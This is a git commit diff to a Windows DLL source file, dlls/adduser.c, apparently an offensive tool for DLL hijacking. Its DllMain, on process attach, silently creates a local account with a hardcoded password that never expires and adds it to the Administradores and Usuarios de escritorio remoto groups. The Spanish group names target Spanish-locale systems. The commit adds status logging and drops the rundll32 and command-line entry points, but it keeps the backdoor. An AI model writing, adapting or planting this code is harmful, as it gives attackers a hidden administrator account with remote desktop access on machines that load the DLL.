2dc027dd54dd90b41c1aec94fe9833ce6a2d5638
sezio <118485549+sergiovks@users.noreply.github.com>
2025-06-03 17:24:22 +0200

    Update adduser.c

--- dlls/adduser.c
+++ dlls/adduser.c
@@ -4,102 +4,45 @@
 
 #pragma comment(lib, "netapi32.lib")
 
-void AddUser()
-{
-	USER_INFO_1 userInfo;
-	DWORD dwLevel = 1;
-	DWORD dwError = 0;
-
-
-	userInfo.usri1_name = L"qaxnb";
-	userInfo.usri1_password = L"Aa@123456";
-	userInfo.usri1_priv = USER_PRIV_USER;
-	userInfo.usri1_home_dir = NULL;
-	userInfo.usri1_comment = NULL;
-	userInfo.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
-	userInfo.usri1_script_path = NULL;
-
-
-	NET_API_STATUS nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&userInfo, &dwError);
-
-	if (nStatus == NERR_Success) {
-	}
-	else {
-		return;
-	}
-
-
-	LOCALGROUP_MEMBERS_INFO_3 account;
-	account.lgrmi3_domainandname = L"qaxnb";
-
-	nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
-
-	if (nStatus == NERR_Success) {
-
-	}
-	else {
-		return;
-	}
-
-
-	nStatus = NetLocalGroupAddMembers(NULL, L"Remote Desktop Users", 3, (LPBYTE)&account, 1);
-
-	if (nStatus == NERR_Success) {
-
-	}
-	else {
-		return;
-	}
-	return 0;
+void LogStatus(const wchar_t* action, NET_API_STATUS status) {
+    if (status == NERR_Success) {
+        wprintf(L"[+] %s: OK\n", action);
+    } else {
+        wprintf(L"[-] %s failed: Error %d\n", action, status);
+    }
 }
 
-DWORD CreateAdminUserInternal(void)
-{
-	AddUser();
-	return 0;
+DWORD AddUserAndGroups() {
+    USER_INFO_1 userInfo;
+    DWORD dwLevel = 1;
+    DWORD dwError = 0;
+
+    userInfo.usri1_name = L"qaxnb";
+    userInfo.usri1_password = L"Aa@123456";
+    userInfo.usri1_priv = USER_PRIV_USER;
+    userInfo.usri1_home_dir = NULL;
+    userInfo.usri1_comment = NULL;
+    userInfo.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
+    userInfo.usri1_script_path = NULL;
+
+    NET_API_STATUS nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&userInfo, &dwError);
+    LogStatus(L"Create user", nStatus);
+
+    LOCALGROUP_MEMBERS_INFO_3 account;
+    account.lgrmi3_domainandname = L"qaxnb";
+
+    nStatus = NetLocalGroupAddMembers(NULL, L"Administradores", 3, (LPBYTE)&account, 1);
+    LogStatus(L"Add to Administradores", nStatus);
+
+    nStatus = NetLocalGroupAddMembers(NULL, L"Usuarios de escritorio remoto", 3, (LPBYTE)&account, 1);
+    LogStatus(L"Add to Usuarios de escritorio remoto", nStatus);
+
+    return 0;
 }
 
-//
-// DLL entry point.
-//
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
-{
-	switch (ul_reason_for_call)
-	{
-	case DLL_PROCESS_ATTACH:
-		CreateAdminUserInternal();
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
-	}
-	return TRUE;
-}
-
-//
-// RUNDLL32 entry point.
-// https://support.microsoft.com/en-us/help/164787/info-windows-rundll-and-rundll32-interface
-//
-
-#ifdef __cplusplus
-extern "C" {
-#endif
-
-__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
-{
-	CreateAdminUserInternal();
-}
-
-#ifdef __cplusplus
-}
-#endif
-
-//
-// Command-line entry point.
-//
-
-int main()
-{
-	return CreateAdminUserInternal();
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        AddUserAndGroups();
+    }
+    return TRUE;
 }
